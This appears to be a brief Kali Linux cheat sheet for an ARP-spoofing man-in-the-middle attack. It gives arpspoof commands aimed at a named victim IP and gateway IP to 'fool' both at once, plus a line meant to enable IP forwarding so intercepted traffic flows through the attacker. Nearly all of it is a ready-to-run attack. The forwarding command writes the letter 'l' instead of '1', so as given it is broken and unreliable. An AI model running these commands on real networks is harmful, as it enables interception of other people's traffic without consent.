# Change arp using buildIn tool in kali linux

# to print the route table
`route -n`

# to print the arp table
`arp -a`
 
# both command to fool victim and gateway should run simultaneously
# command to fool victim
# command  -i(interface) -t(target) (target ip) (gateway ip)
`arpspoof -i eth0 -t 192.168.12.102 192.168.12.1`

# command to fool gateway
`arpspoof -i eth0 -t 192.168.12.1 192.168.12.102`

# by default port forwarding is disabled in linux in order to allow packets to flow from your machine
`echo l > /proc/sys/net/ipv4/ip_forward`